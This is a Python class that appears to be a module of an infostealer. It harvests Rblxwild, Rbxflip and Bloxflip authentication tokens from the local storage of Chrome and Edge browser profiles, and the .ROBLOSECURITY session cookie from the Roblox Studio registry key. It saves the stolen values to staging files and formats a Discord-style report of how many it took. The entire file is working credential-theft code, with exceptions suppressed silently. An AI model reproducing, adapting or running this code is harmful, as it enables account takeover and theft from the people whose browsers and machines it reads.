class Roblox:

    def __init__(self):
        os.mkdir(os.path.join(P4THF0LDR, "Roblox"))
        self.robloxfolder = os.path.join(P4THF0LDR, "Roblox")
        self.bloxflip = 0
        self.robloxcookies = 0
        self.rbxflip = 0
        self.rblxwild = 0
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}']
        self.prof = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        self.RobloxStudio()
        for i in paths:
            if os.path.exists(i):
                self.Rblxwild(i)
        for i in paths:
            if os.path.exists(i):
                self.Rbxflip(i)
        for i in paths:
            if os.path.exists(i):
                self.Bloxflip(i)
        self.__repr__()

    def Rblxwild(self,p):
        filo=open(self.robloxfolder+"\\Rblxwild_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file = file.split("_https://rblxwild.com")
                            for tok in file:
                                t = "bd"+tok.split("authToken")[1].split("bd")[1].split("\\x")[0]
                                if len(t)>50:
                                    self.rblxwild += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass
        filo.close()

    def Rbxflip(self,p):
        filo=open(self.robloxfolder+"\\Rbxflip_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            if "https://www.rbxflip.com" in file:
                                file2 = file.split("https://www.rbxflip.com")
                                for tok in file2:
                                    t = tok.split("Bearer ")[1].split("\\x")[0]
                                    self.rbxflip += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass
        filo.close()

    def Bloxflip(self,p):
        filo=open(self.robloxfolder+"\\Bloxflip_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file2 = file.split("_DO_NOT_SHARE_BLOXFLIP_TOKEN")
                            for tok in file2:
                                try:
                                    t = "ywmz0d/"+tok.split("ywmz0d/")[1][:2000].split("\\x")[0].replace("%","")
                                    self.bloxflip += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                                except:pass
                        except:pass
        except:pass
        filo.close()

    def RobloxStudio(self):
        filo=open(self.robloxfolder+"\\Roblox_Cookies.txt","w+")
        try:
            robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
            count = 0
            while True:
                name, value, type = EnumValue(robloxstudiopath, count)
                if name == ".ROBLOSECURITY":
                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
                    self.robloxcookies += 1
                    filo.write(f"\n.ROBLOSECURITY : {value}\n\n"+"-"*35)
                count = count + 1
        except WindowsError:
            pass
        filo.close()
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Roblox``
``|   |_``:page_facing_up: ``({self.bloxflip}) Bloxflip_Tokens``
``|   |_``:page_facing_up: ``({self.robloxcookies}) Roblox_Cookies``
``|   |_``:page_facing_up: ``({self.rbxflip}) Rbxflip_Tokens``
``|   |_``:page_facing_up: ``({self.rblxwild}) Rblxwild_Tokens``"""